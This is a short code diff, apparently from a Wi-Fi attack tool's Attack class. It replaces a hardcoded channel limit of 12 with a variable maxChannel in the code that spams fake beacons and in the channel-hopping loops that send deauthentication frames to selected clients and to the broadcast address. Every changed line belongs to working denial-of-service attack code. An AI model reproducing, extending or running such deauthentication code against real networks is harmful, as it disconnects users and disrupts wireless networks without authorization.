@@ -11,7 +11,7 @@ void Attack::generate(){
   uint8_t _randomMacBuffer[6];
   beaconAdrs._clear();
 
-  for(int i=0;i<macListLen;i++) channels[i] = random(1,12);
+  for(int i=0;i<macListLen;i++) channels[i] = random(1,maxChannel);
   do{
     getRandomVendorMac(_randomMacBuffer);
     for(int i=0;i<6;i++) _randomBeaconMac.setAt(_randomMacBuffer[i],i);
@@ -136,7 +136,7 @@ void Attack::run(){
             _selectedClients++;
 
             if(settings.channelHop){
-              for(int j=1;j<12;j++){
+              for(int j=1;j<maxChannel;j++){
                 wifi_set_channel(j);
                 
                 buildDeauth(_ap, clientScan.getClientMac(i), 0xc0, settings.deauthReason );
@@ -160,7 +160,7 @@ void Attack::run(){
           _client.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
 
           if(settings.channelHop){
-              for(int j=1;j<12;j++){
+              for(int j=1;j<maxChannel;j++){
                 wifi_set_channel(j);
 
                 buildDeauth(_ap, _client, 0xc0, settings.deauthReason );
